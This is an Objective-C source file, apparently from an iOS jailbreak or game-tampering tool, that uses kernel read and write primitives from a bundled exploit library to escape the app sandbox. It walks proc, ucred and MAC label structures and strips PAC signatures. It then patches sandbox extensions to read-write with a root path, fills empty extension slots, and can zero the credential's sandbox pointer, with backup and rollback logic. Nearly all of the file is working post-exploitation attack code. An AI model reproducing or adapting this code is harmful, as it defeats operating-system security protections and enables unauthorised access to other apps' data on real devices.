//
//  SbxSurgeon.m
//  最小补丁 · 先备份再动手 · 验不过立刻回滚
//
//  这套代码只做一件事：让「本进程」能进游戏的数据容器。
//  不碰 launchd、不碰 SpringBoard、不装持久化、不改页表、不做 codesign 绕过。
//  所有写操作都进备份表，验不过 sxs_rollback() 原样写回。
//

#import <Foundation/Foundation.h>

#include <stdbool.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <mach/machine.h>

#include "SbxSurgeon.h"
#include "kexploit/darksword.h"
#include "kexploit/offsets.h"
#include "kexploit/utils.h"
#include "CrashGuard.h"

// 结构偏移：优先用运行期已经校准过的值，没校准就用社区稳定值
#define SXS_OFF_PROC_RO       (off_proc_p_proc_ro        ? off_proc_p_proc_ro        : 0x18)
#define SXS_OFF_UCRED_LABEL   (off_ucred_cr_label        ? off_ucred_cr_label        : 0x78)
#define SXS_OFF_LABEL_SANDBOX (off_label_l_perpolicy_sandbox ? off_label_l_perpolicy_sandbox : 0x10)
#define SXS_OFF_SANDBOX_EXTSET 0x10
#define SXS_OFF_EXT_DATA      0x40
#define SXS_OFF_EXT_DATALEN   0x48
#define SXS_EXT_SLOTS         16
#define SXS_CHAIN_MAX         64
#define SXS_MAX_BAK           160
#define SXS_BAK_MAX_LEN       64

typedef struct {
    uint64_t addr;
    uint32_t len;
    uint8_t  old[SXS_BAK_MAX_LEN];
} sxs_bak_t;

static sxs_bak_t g_bak[SXS_MAX_BAK];
static int       g_bakN = 0;
static int       g_errno_v = 0;
static char      g_verdict[512] = "还没跑过";
static uint64_t  g_extset = 0;
static sxs_probe_t g_last;

// MARK: - 指针还原

static bool sxs_ispac(void) {
    static int cached = -1;
    if (cached >= 0) return cached != 0;
    cpu_subtype_t sub = 0;
    size_t sz = sizeof(sub);
    if (sysctlbyname("hw.cpusubtype", &sub, &sz, NULL, 0) != 0) {
        cached = 0;
        return false;
    }
    cached = (sub == CPU_SUBTYPE_ARM64E) ? 1 : 0;
    return cached != 0;
}

static inline uint64_t sxs_xpaci(uint64_t a) {
    if (!sxs_ispac()) return a;
    if ((a & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) return a;
    register uint64_t x0 asm("x0") = a;
    asm volatile(".long 0xDAC143E0" : "+r"(x0)); // XPACI X0
    return x0;
}

static inline uint64_t sxs_sign(uint64_t v) {
    if ((v >> 32) > 0xFFFF) return v | pac_mask;
    return v;
}

static inline bool sxs_k(uint64_t v) {
    return v > VM_MIN_KERNEL_ADDRESS;
}

/// 把读出来的原始值还原成能用的内核指针：PAC 剥签 → 补高位 → SMR 解码兜底
static uint64_t sxs_ptr(uint64_t raw) {
    uint64_t v = sxs_xpaci(raw);
    if (sxs_k(v)) return v;

    uint64_t s = sxs_sign(v);
    if (sxs_k(s)) return s;

    if (t1sz_boot > 0 && t1sz_boot < 62 && smr_base > 0) {
        uint64_t bits = (smr_base << (62 - (uint8_t)t1sz_boot));
        uint64_t d = ((v & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
        if (sxs_k(d)) return d;
    }
    return v;
}

static void sbx_try_log(uint32_t off, const char *why) {
    NSLog(@"[sbx] 候选 sandbox+0x%x：%s", (unsigned)off, why);
}

static void sxs_say(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void sxs_say(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    snprintf(g_verdict, sizeof(g_verdict), "%s", buf);
    NSLog(@"[sbx] %s", buf);
}

// MARK: - 备份表

/// v9.8：写内核之前先问一句「这块让不让写」。
/// 上一版两次重启的根子就在这里：它把类别字符串写进了内核的只读映射区
/// （0xfffffff0… 那一带的 __TEXT/__cstring），那不是「写了没生效」，
/// 是落笔那一下就被完整性保护逮住，整机重启。
/// 所以从这一版起，所有写操作只允许落在 kalloc 堆（0xffffffe0… ~ 0xfffffff0…）。
static bool sxs_ok_to_write(uint64_t addr, uint32_t len) {
    if (!sxs_k(addr) || len == 0) return false;
    if (addr < 0xffffffE000000000ULL) return false;   // 内核只读映像 / 非法地址
    if (addr >= 0xfffffff000000000ULL) return false;  // 内核 text / data 映射区
    if (len > 0x1000) return false;
    return true;
}

int sxs_addr_writable(uint64_t addr) {
    return sxs_ok_to_write(addr, 1) ? 1 : 0;
}

static void sxs_save(uint64_t addr, uint32_t len) {
    if (!sxs_k(addr) || len == 0) return;
    if (len > SXS_BAK_MAX_LEN) len = SXS_BAK_MAX_LEN;
    for (int i = 0; i < g_bakN; i++) {
        if (g_bak[i].addr == addr && g_bak[i].len == len) return;  // 备份过就不再覆盖
    }
    if (g_bakN >= SXS_MAX_BAK) return;
    g_bak[g_bakN].addr = addr;
    g_bak[g_bakN].len  = len;
    memset(g_bak[g_bakN].old, 0, SXS_BAK_MAX_LEN);
    ds_kread(addr, g_bak[g_bakN].old, len);
    g_bakN++;
}

int sxs_patch_count(void) {
    return g_bakN;
}

int sxs_rollback(void) {
    int n = 0;
    for (int i = g_bakN - 1; i >= 0; i--) {
        if (!sxs_k(g_bak[i].addr) || g_bak[i].len == 0) continue;
        ds_kwrite(g_bak[i].addr, g_bak[i].old, g_bak[i].len);
        n++;
    }
    g_bakN = 0;
    sxs_say("已回滚 %d 处，内核恢复原样", n);
    return n;
}

// MARK: - 门诊（只读）

const char *sxs_note(const sxs_probe_t *p) {
    return p ? p->note : "";
}

int sxs_ready(void) {
    return (ds_is_ready() && ds_get_our_proc() != 0) ? 1 : 0;
}

static uint64_t sxs_our_proc(void) {
    uint64_t p = ds_get_our_proc();
    if (!p) p = ourproc();
    return p;
}

/// 从 proc 找到 ucred：先按运行期偏移，再在 proc_ro 里逐格扫（和上游同一个扫法）
static uint64_t sxs_find_ucred(uint64_t proc, char *note, size_t noteLen) {
    if (!sxs_k(proc)) {
        if (note) snprintf(note, noteLen, "proc 指针无效");
        return 0;
    }
    uint64_t procro = sxs_ptr(ds_kread64(proc + SXS_OFF_PROC_RO));
    if (!sxs_k(procro)) {
        if (note) snprintf(note, noteLen, "proc_ro 无效（+0x%x 读到 0x%llx）",
                           (unsigned)SXS_OFF_PROC_RO,
                           (unsigned long long)ds_kread64(proc + SXS_OFF_PROC_RO));
        return 0;
    }

    uint32_t cand[10];
    int cn = 0;
    if (off_proc_ro_p_ucred) cand[cn++] = off_proc_ro_p_ucred;
    for (uint32_t o = 0x10; o <= 0x40; o += 8) {
        bool dup = false;
        for (int i = 0; i < cn; i++) if (cand[i] == o) dup = true;
        if (!dup) cand[cn++] = o;
    }

    for (int i = 0; i < cn; i++) {
        uint64_t raw = ds_kread64(procro + cand[i]);
        uint64_t uc  = sxs_ptr(raw);
        if (!sxs_k(uc)) continue;
        uint64_t label = sxs_ptr(ds_kread64(uc + SXS_OFF_UCRED_LABEL));
        if (!sxs_k(label)) continue;
        uint64_t sb = sxs_ptr(ds_kread64(label + SXS_OFF_LABEL_SANDBOX));
        if (!sxs_k(sb)) continue;
        if (note) snprintf(note, noteLen, "ucred 命中 proc_ro+0x%x", (unsigned)cand[i]);
        return uc;
    }

    if (note) snprintf(note, noteLen, "proc_ro 里 0x10~0x40 没扫到自洽的 ucred");
    return 0;
}

int sxs_probe(sxs_probe_t *out) {
    if (!out) return -1;
    memset(out, 0, sizeof(*out));
    memset(&g_last, 0, sizeof(g_last));

    if (!ds_is_ready()) {
        snprintf(out->note, sizeof(out->note), "内核读写还没就绪，门诊不做");
        return -1;
    }

    uint64_t proc = sxs_our_proc();
    if (!sxs_k(proc)) {
        snprintf(out->note, sizeof(out->note), "拿不到本进程的 proc（0x%llx）",
                 (unsigned long long)proc);
        return -2;
    }

    char ucNote[192] = {0};
    uint64_t ucred = sxs_find_ucred(proc, ucNote, sizeof(ucNote));
    if (!ucred) {
        snprintf(out->note, sizeof(out->note),
                 "proc=0x%llx，但 %s —— 这台机器的进程结构和已知布局对不上，不往下写",
                 (unsigned long long)proc, ucNote);
        return -3;
    }
    out->ucred = ucred;

    uint64_t label = sxs_ptr(ds_kread64(ucred + SXS_OFF_UCRED_LABEL));
    if (!sxs_k(label)) {
        snprintf(out->note, sizeof(out->note), "ucred=0x%llx，cr_label 无效（+0x%x）",
                 (unsigned long long)ucred, (unsigned)SXS_OFF_UCRED_LABEL);
        return -4;
    }
    out->label = label;

    uint64_t sandbox = sxs_ptr(ds_kread64(label + SXS_OFF_LABEL_SANDBOX));
    if (!sxs_k(sandbox)) {
        snprintf(out->note, sizeof(out->note),
                 "label=0x%llx，sandbox 指针无效（+0x%x）—— 这个进程可能根本没有沙盒标签",
                 (unsigned long long)label, (unsigned)SXS_OFF_LABEL_SANDBOX);
        return -5;
    }
    out->sandbox = sandbox;

    // ext_set 在主结构里的位置：先按已知布局，读不出有效链再试两个备用位置。
    // 这一步全程只读，读错了也只会判定「没命中」，不会写坏任何东西。
    const uint32_t esCand[3] = { SXS_OFF_SANDBOX_EXTSET, 0x18, 0x08 };
    uint64_t extset = 0;
    int slots = 0, nodes = 0, dataok = 0;
    uint32_t usedOff = 0;

    for (int c = 0; c < 3; c++) {
        uint64_t es = sxs_ptr(ds_kread64(sandbox + esCand[c]));
        if (!sxs_k(es)) {
            sbx_try_log(esCand[c], "指针无效");
            continue;
        }

        int s_slots = 0, s_nodes = 0, s_dataok = 0;
        for (int s = 0; s < SXS_EXT_SLOTS; s++) {
            uint64_t hdr = sxs_ptr(ds_kread64(es + s * 8));
            if (!sxs_k(hdr)) continue;
            s_slots++;

            uint64_t cur = hdr;
            for (int i = 0; i < SXS_CHAIN_MAX && sxs_k(cur); i++) {
                uint64_t ext = sxs_ptr(ds_kread64(cur + 0x8));
                if (sxs_k(ext)) {
                    s_nodes++;
                    uint64_t da = sxs_ptr(ds_kread64(ext + SXS_OFF_EXT_DATA));
                    uint64_t dl = ds_kread64(ext + SXS_OFF_EXT_DATALEN);
                    if (sxs_k(da) && dl > 0 && dl <= 0x100000) s_dataok++;
                }
                uint64_t next = sxs_ptr(ds_kread64(cur));
                if (!sxs_k(next) || next == cur) break;
                cur = next;
            }
        }

        if (s_slots > 0 && s_slots > slots) {
            slots = s_slots;
            nodes = s_nodes;
            dataok = s_dataok;
            extset = es;
            usedOff = esCand[c];
        }
        if (s_slots > 0 && s_nodes > 0 && s_dataok > 0) break;   // 够用了，不再试别的
    }

    if (slots == 0) {
        snprintf(out->note, sizeof(out->note),
                 "sandbox=0x%llx 里三个候选位置(+0x10/+0x18/+0x08)都没读到有效扩展链 —— "
                 "这台机器的沙盒结构和已知布局不一致，再往下写就是拿整机冒险，停。",
                 (unsigned long long)sandbox);
        return -7;
    }
    if (nodes == 0 || dataok == 0) {
        snprintf(out->note, sizeof(out->note),
                 "ext_set(0x%llx，位于 sandbox+0x%x) 有 %d 个槽，但 extension=%d、data 有效=%d —— "
                 "结构读到一半就断了，停。",
                 (unsigned long long)extset, (unsigned)usedOff, slots, nodes, dataok);
        return -8;
    }

    out->extset = extset;
    g_extset = extset;
    out->slots  = slots;
    out->nodes  = nodes;
    out->dataok = dataok;
    out->ok = 1;

    snprintf(out->note, sizeof(out->note),
             "结构自洽：ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx(+0x%x) "
             "槽=%d 节点=%d data有效=%d",
             (unsigned long long)ucred, (unsigned long long)label,
             (unsigned long long)sandbox, (unsigned long long)extset, (unsigned)usedOff,
             slots, nodes, dataok);

    g_last = *out;
    return 0;
}

// MARK: - 补丁三级

/// 第 1 级：把扩展的权限类别换成 read-write（只改指针和类别字符串）
static int sxs_level1_one(uint64_t hdr) {
    // 上游只在 hdr+0x10 本来就有值时才改这一类，这里保持一致，避免动到空槽
    if (!sxs_k(sxs_ptr(ds_kread64(hdr + 0x10)))) return 0;
    uint64_t ext = sxs_ptr(ds_kread64(hdr + 0x8));
    if (!sxs_k(ext)) return 0;
    uint64_t da = sxs_ptr(ds_kread64(ext + SXS_OFF_EXT_DATA));
    if (!sxs_k(da)) return 0;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[SXS_BAK_MAX_LEN];
    memset(b1, 0, sizeof(b1));
    size_t n = strlen(rw);
    if (n >= sizeof(b1)) n = sizeof(b1) - 1;
    memcpy(b1, rw, n);

    uint8_t zero[SXS_BAK_MAX_LEN];
    memset(zero, 0, sizeof(zero));

    // v9.8 护栏：只允许写内核堆。写到只读映像上会当场触发保护 → 整机重启。
    if (!sxs_ok_to_write(da + 32, SXS_BAK_MAX_LEN) ||
        !sxs_ok_to_write(da + 64, SXS_BAK_MAX_LEN) ||
        !sxs_ok_to_write(hdr + 0x10, 8)) {
        sbx_try_log(0, "类别字符串落在只读区，拒绝写（不再冒重启的险）");
        return 0;
    }

    sxs_save(da + 32, SXS_BAK_MAX_LEN);
    sxs_save(da + 64, SXS_BAK_MAX_LEN);
    sxs_save(hdr + 0x10, 8);

    ds_kwrite(da + 32, b1, SXS_BAK_MAX_LEN);
    ds_kwrite(da + 64, zero, SXS_BAK_MAX_LEN);

    uint64_t target = da + 32;
    ds_kwrite(hdr + 0x10, &target, 8);
    return 1;
}

/// 第 2 级：把扩展的数据区放开（路径 + 标志位 + 长度）
static int sxs_level2_one(uint64_t hdr) {
    uint64_t ext = sxs_ptr(ds_kread64(hdr + 0x8));
    if (!sxs_k(ext)) return 0;
    uint64_t da = sxs_ptr(ds_kread64(ext + SXS_OFF_EXT_DATA));
    uint64_t dl = ds_kread64(ext + SXS_OFF_EXT_DATALEN);
    if (!sxs_k(da) || dl == 0 || dl > 0x100000) return 0;

    if (!sxs_ok_to_write(da, 0x20) ||
        !sxs_ok_to_write(ext + SXS_OFF_EXT_DATA + 0x08, 0x10)) {
        sbx_try_log(0, "扩展数据区落在只读区，拒绝写");
        return 0;
    }

    // 数据区开头换成根路径
    uint8_t buf[0x20];
    ds_kread(da, buf, 0x20);
    buf[0] = '/';
    buf[1] = 0;
    sxs_save(da, 0x20);
    ds_kwrite(da, buf, 0x20);

    // 扩展结构体上的长度：只改 datalen，不再顺手把 +0x50 写成全 1。
    // 那个字段在不同版本上含义不定，写成 0xffffffffffffffff 后，内核一遍历就踩空。
    uint8_t chunk[0x20];
    ds_kread(ext + SXS_OFF_EXT_DATA, chunk, 0x20);
    *(uint64_t *)(chunk + 0x08) = 1;
    sxs_save(ext + SXS_OFF_EXT_DATA + 0x08, 8);
    ds_kwrite(ext + SXS_OFF_EXT_DATA + 0x08, chunk + 0x08, 8);
    return 1;
}

/// 第 3 级：把空的哈希槽补上一个现成的 hdr（原版做法，动静最大）
static int sxs_level3(void) {
    if (!sxs_k(g_extset)) return 0;

    uint64_t src = 0;
    for (int s = 0; s < SXS_EXT_SLOTS && !src; s++) {
        uint64_t h = sxs_ptr(ds_kread64(g_extset + s * 8));
        if (sxs_k(h)) src = h;
    }
    if (!src) return 0;

    int filled = 0;
    for (int s = 0; s < SXS_EXT_SLOTS; s++) {
        uint64_t h = ds_kread64(g_extset + s * 8);
        if (sxs_k(sxs_ptr(h))) continue;
        if (!sxs_ok_to_write(g_extset + s * 8, 8)) {
            sbx_try_log(0, "扩展槽落在只读区，拒绝补槽");
            continue;
        }
        sxs_save(g_extset + s * 8, 8);
        ds_kwrite(g_extset + s * 8, &src, 8);
        filled++;
    }
    return filled;
}

int sxs_patch(int level) {
    if (level < 1) level = 1;
    if (level > SXS_LEVEL_MAX) level = SXS_LEVEL_MAX;

    if (!sxs_k(g_extset)) {
        sxs_probe_t p;
        int r = sxs_probe(&p);
        if (r != 0) {
            sxs_say("门诊没过，不写：%s", p.note);
            return -1;
        }
    }
    if (!sxs_k(g_extset)) {
        sxs_say("ext_set 无效，不写");
        return -2;
    }

    cg_mark("沙盒补丁/开始写");
    int changed = 0;

    for (int s = 0; s < SXS_EXT_SLOTS; s++) {
        cg_beat();
        uint64_t hdr = sxs_ptr(ds_kread64(g_extset + s * 8));
        if (!sxs_k(hdr)) continue;

        uint64_t cur = hdr;
        for (int i = 0; i < SXS_CHAIN_MAX && sxs_k(cur); i++) {
            cg_beat();
            changed += sxs_level1_one(cur);
            if (level >= 2) changed += sxs_level2_one(cur);
            uint64_t next = sxs_ptr(ds_kread64(cur));
            if (!sxs_k(next) || next == cur) break;
            cur = next;
        }
    }

    if (level >= 3) {
        cg_mark("沙盒补丁/补空槽");
        changed += sxs_level3();
    }

    sxs_say("第 %d 级补丁写完，改动 %d 处（备份 %d 条）", level, changed, g_bakN);
    return changed;
}

// MARK: - v9.8：凭证路线（只摘一个沙盒指针）

static char g_cred_note[512] = "还没跑过";
static int  g_cred_level = 0;

const char *sxs_cred_note(void) {
    return g_cred_note;
}

int sxs_cred_count(void) {
    return g_bakN;
}

int sxs_cred_rollback(void) {
    int n = sxs_rollback();
    g_cred_level = 0;
    snprintf(g_cred_note, sizeof(g_cred_note), "已回滚 %d 处，凭证恢复原样", n);
    return n;
}

/// 只做一件事：把本进程凭证里那个「沙盒」指针摘掉。
///
/// 为什么这一招比上一版安全一个数量级：
///   - 只写 8 字节，一个指针，指到 0
///   - 写的是 kalloc 堆里的 label 结构，不是任何字符串常量
///   - 不遍历、不遍历扩展链、不改 uid、不动 pid、不碰页表
///   - 沙盒子系统在入口处对空指针就是放行（内核没挂沙盒时这个指针本来就是 0）
int sxs_cred_patch(void) {
    g_cred_level = 0;

    if (!ds_is_ready()) {
        snprintf(g_cred_note, sizeof(g_cred_note), "内核读写没就绪，不动");
        return -1;
    }

    uint64_t proc = sxs_our_proc();
    if (!sxs_k(proc)) {
        snprintf(g_cred_note, sizeof(g_cred_note), "拿不到本进程 proc（0x%llx）", (unsigned long long)proc);
        return -2;
    }

    char ucNote[192] = {0};
    uint64_t ucred = sxs_find_ucred(proc, ucNote, sizeof(ucNote));
    if (!ucred) {
        snprintf(g_cred_note, sizeof(g_cred_note), "ucred 没定位到：%s", ucNote);
        return -3;
    }

    uint64_t labelRaw = ds_kread64(ucred + SXS_OFF_UCRED_LABEL);
    uint64_t label = sxs_ptr(labelRaw);
    if (!sxs_k(label)) {
        snprintf(g_cred_note, sizeof(g_cred_note),
                 "ucred=0x%llx 的 cr_label 无效（+0x%x 读到 0x%llx）",
                 (unsigned long long)ucred, (unsigned)SXS_OFF_UCRED_LABEL,
                 (unsigned long long)labelRaw);
        return -4;
    }

    uint64_t slot = label + SXS_OFF_LABEL_SANDBOX;
    uint64_t sbRaw = ds_kread64(slot);
    uint64_t sb = sxs_ptr(sbRaw);

    // 本来就没有沙盒标签 —— 那这台机器根本不该卡在这一步，直接算通过
    if (!sxs_k(sb)) {
        snprintf(g_cred_note, sizeof(g_cred_note),
                 "凭证里本来就没有沙盒指针（label=0x%llx +0x%x = 0x%llx），不用改",
                 (unsigned long long)label, (unsigned)SXS_OFF_LABEL_SANDBOX,
                 (unsigned long long)sbRaw);
        g_cred_level = 0;
        return 0;
    }

    // 护栏：只允许写 kalloc 堆。写到只读映像上就是上一次那个重启。
    if (!sxs_ok_to_write(slot, 8)) {
        snprintf(g_cred_note, sizeof(g_cred_note),
                 "沙盒指针所在位置 0x%llx 不在可写区（只读映像），拒绝写 —— 这一刀不能下",
                 (unsigned long long)slot);
        return -5;
    }

    cg_mark("摘沙盒/写凭证");
    sxs_save(slot, 8);
    uint64_t zero = 0;
    ds_kwrite(slot, &zero, 8);

    uint64_t back = ds_kread64(slot);
    if (back != 0) {
        snprintf(g_cred_note, sizeof(g_cred_note),
                 "写了但读回不是 0（0x%llx）—— 这个位置没写进去，先回滚",
                 (unsigned long long)back);
        sxs_rollback();
        return -6;
    }

    g_cred_level = 1;
    snprintf(g_cred_note, sizeof(g_cred_note),
             "沙盒指针已摘：ucred=0x%llx label=0x%llx 原值 0x%llx → 0 · 只写了这 8 字节",
             (unsigned long long)ucred, (unsigned long long)label,
             (unsigned long long)sb);
    sxs_say("%s", g_cred_note);
    return 1;
}

// MARK: - 验证

int sxs_open_count(const char *path) {
    g_errno_v = 0;
    if (!path) return -EINVAL;
    DIR *d = opendir(path);
    if (!d) {
        g_errno_v = errno;
        return -errno;
    }
    int n = 0;
    struct dirent *e = NULL;
    while ((e = readdir(d)) != NULL) {
        if (strcmp(e->d_name, ".") == 0 || strcmp(e->d_name, "..") == 0) continue;
        n++;
        if (n > 20000) break;
    }
    closedir(d);
    return n;
}

int sxs_writable(const char *path) {
    g_errno_v = 0;
    if (!path) return 0;
    if (access(path, W_OK) != 0) {
        g_errno_v = errno;
        return 0;
    }
    return 1;
}

int sxs_errno(void) {
    return g_errno_v;
}

const char *sxs_verdict(void) {
    return g_verdict;
}
